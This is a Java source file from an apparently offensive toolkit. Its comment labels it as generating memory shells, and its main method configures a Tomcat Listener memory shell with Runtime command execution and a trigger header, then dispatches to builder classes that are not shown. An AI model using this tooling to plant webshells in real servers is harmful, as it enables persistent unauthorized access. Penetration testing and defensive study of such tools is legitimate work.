package com.ppp;

import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.*;
import com.ppp.utils.Reflections;
import com.ppp.utils.maker.ClassUtils;
import com.ppp.utils.maker.Encoder;

import java.lang.reflect.Method;
import java.util.List;

/**
 * @author Whoopsunix
 * 内存马生成
 */

public class JavaClassScheduler {
    private static String schedulerPackageName = "com.ppp.scheduler";

    public static void main(String[] args) throws Exception {
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.MemShell);
        javaClassHelper.setMiddleware(Middleware.Tomcat);
        javaClassHelper.setMemShell(MemShell.Listener);
        javaClassHelper.setMemShellFunction(MemShellFunction.Runtime);

        // 内存马信息
        javaClassHelper.setHEADER("xxx");

        build(javaClassHelper);
    }

    public static byte[] build(JavaClassHelper javaClassHelper) throws Exception {
        String javaClassHelperType = javaClassHelper.getJavaClassHelperType();

        Class builderClass = null;

        List<Class<?>> schedulerClasses = ClassUtils.getClasses(schedulerPackageName);
        for (Class<?> clazz : schedulerClasses) {
            JavaClassHelperType javaClassHelperTypeAnnotation = clazz.getAnnotation(JavaClassHelperType.class);
            if (javaClassHelperTypeAnnotation == null) continue;

            if (javaClassHelperTypeAnnotation.value().equals(javaClassHelperType)) {
                builderClass = clazz;
                break;
            }
        }

        return (byte[]) Reflections.invokeMethod(builderClass.newInstance(), "build", javaClassHelper);

    }

}
